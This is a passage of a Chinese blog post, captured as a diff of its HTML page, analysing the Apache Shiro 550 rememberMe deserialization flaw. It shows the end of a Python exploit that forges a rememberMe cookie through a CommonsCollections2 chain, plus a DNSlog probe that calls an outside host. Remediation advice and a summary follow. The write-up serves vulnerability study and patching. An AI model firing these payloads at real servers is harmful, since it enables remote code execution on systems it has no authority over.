class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># cc2的exp</span></span><br><span class="line">    payload = encode_rememberme(<span class="string">'/System/Applications/Calculator.app/Contents/MacOS/Calculator'</span>)</span><br><span class="line">    print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload.decode()))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dnslog的poc</span></span><br><span class="line">    payload1 = encode_rememberme(<span class="string">'http://ca4qki.dnslog.cn/'</span>)</span><br><span class="line">    print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload1.decode()))</span><br><span class="line"></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">"rememberMe"</span>: payload.decode()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requests.get(url=<span class="string">"http://127.0.0.1:8080/web_war/"</span>, cookies=cookie)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x05-修复"><a href="#0x05-修复" class="headerlink" title="0x05 修复"></a>0x05 修复</h1><p>1.升级Shiro到最新版</p>
+<p>2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p>
+<p>3.WAF拦截Cookie中长度过大的rememberMe值</p>
+<h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>本次是用ysoserial直接生成序列化内容，而且使用CommonsCollections2这个利用链，只是简单的直接利用，但是实际利用情况十分复杂，关乎java的版本还有各种组件的版本，想要一个完美的利用链还是得自己改造，准备下一篇文章，再研究各种利用链的情况，和改造各种利用链适配问题。</p>
+<h1 id="0x07-小trips："><a href="#0x07-小trips：" class="headerlink" title="0x07 小trips："></a>0x07 小trips：</h1><p>如何搜索lib包里面的东西呢？</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIwOTEzMjMucG5n?x-oss-process=image/format,png" alt="image-20200902091323860"></p>
+<p>双击shift , 调出全局搜索框就可以搜索到 jar包里的类了</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-Shiro-550-漏洞描述"><span class="toc-number">2.</span> <span class="toc-text">0x01 Shiro 550 漏洞描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-环境搭建"><span class="toc-number">3.</span> <span class="toc-text">0x02 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础环境"><span class="toc-number">3.1.</span> <span class="toc-text">基础环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#搭建过程"><span class="toc-number">3.2.</span> <span class="toc-text">搭建过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#正常搭建"><span class="toc-number">3.2.1.</span> <span class="toc-text">正常搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#坑点："><span class="toc-number">3.3.</span> <span class="toc-text">坑点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-代码分析"><span class="toc-number">4.</span> <span class="toc-text">0x03 代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#加密过程"><span class="toc-number">4.1.</span> <span class="toc-text">加密过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解密过程："><span class="toc-number">4.2.</span> <span class="toc-text">解密过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#详细看看decrypt解密函数："><span class="toc-number">4.2.1.</span> <span class="toc-text">详细看看decrypt解密函数：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解密完成，序列化操作"><span class="toc-number">4.3.</span> <span class="toc-text">解密完成，序列化操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-编写POC-EXP"><span class="toc-number">5.</span> <span class="toc-text">0x04 编写POC EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#本次AES加密的一些小知识点："><span class="toc-number">5.1.</span> <span class="toc-text">本次AES加密的一些小知识点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路"><span class="toc-number">5.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python代码"><span class="toc-number">5.3.</span> <span class="toc-text">Python代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-修复"><span class="toc-number">6.</span> <span class="toc-text">0x05 修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-总结"><span class="toc-number">7.</span> <span class="toc-text">0x06 总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-小trips："><span class="toc-number">8.</span> <span class="toc-text">0x07 小trips：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&text=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&title=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&is_video=false&description=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shiro 550 反序列化漏洞 详细分析+poc编写&body=Check out this article: https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&title=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&title=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&title=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&title=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&name=Shiro 550 反序列化漏洞 详细分析+poc编写&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&t=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    Zeo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
